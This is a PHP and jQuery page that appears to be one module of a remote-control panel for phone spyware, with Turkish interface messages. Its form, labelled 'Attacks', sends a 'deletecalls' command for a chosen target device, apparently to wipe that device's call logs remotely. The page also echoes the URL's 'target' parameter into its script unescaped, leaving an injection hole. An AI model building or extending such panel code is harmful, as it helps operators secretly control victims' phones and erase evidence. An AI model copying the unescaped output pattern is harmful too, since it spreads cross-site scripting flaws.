<?php 
require_once 'module_controller.php';
?>
    <div class="row">
        <div class="col-md-11 col-lg-offset-0">
            <div class="well">

                <div class="row"></div>
                <br><br>
                <legend>DeletecallLogs</legend>
                <div class="row">
                    <form class="form-horizontal col-md-8 col-lg-offset-1">
                        <fieldset>
                            <div class="col-md-10 col-lg-offset-4">
                                <label for="select" class="col-lg-4 control-label">Attacks</label>

                                <div class="col-lg-4">
                                    <select class="form-control" id="selected-message-id" name="selected-message-id">
                                        <option>DeleteLogs</option>
                                        
                                    </select>
                                </div>
                            </div>



                            <div class="form-group">
                                <label for="sms-content-id" class="col-lg-2 control-label">FunPanel</label>
                                <div class="col-lg-10">
                                    <textarea class="form-control" rows="4" id="sms-content-id" placeholder="Type: DelteLogs"></textarea>
                                </div>
                            </div>

                            <div class="form-group">
                                <div class="col-lg-10 col-lg-offset-2">
                                    <button id="send-btn-id" name="send-btn-id" type="button" class="btn btn-default">Send</button>
                                </div>
                            </div>
                        </fieldset>
                    </form>
                </div>
                <br><br>
            </div>
        </div>
    </div>

    <script>

        $("#send-btn-id").click(function() {
            var messageType =  $("#selected-message-id option:selected").text().trim();
            var messageContent = $("#sms-content-id").val().trim()+'';

          if (messageType != '' && messageContent!=''){

                var commands = {
                    send_command: true,
                    target:"<?php echo $_GET['target'];?>",
                    type: 'deletecalls',
                    value: {
                            "message_type": messageType, "message_content": messageContent
                        }
                };

           

                $.post( "commands.php", commands, function( data, err ) {
                    if (data.status){
                        Toastify({
                            text: "Komut gönderildi.!",
                            backgroundColor: "linear-gradient(to right, #008000, #00FF00)",
                            className: "info",
                        }).showToast();
                    } else {
                        Toastify({
                            text: "Komut başarısız.!",
                            backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
                            className: "info",
                        }).showToast();
                    }

                }, "json");
            } else {
                Toastify({
                    text: "Lütfen alanları boş bırakmayınız...!",
                    backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
                    className: "info",
                }).showToast();
            }

        });

    </script>
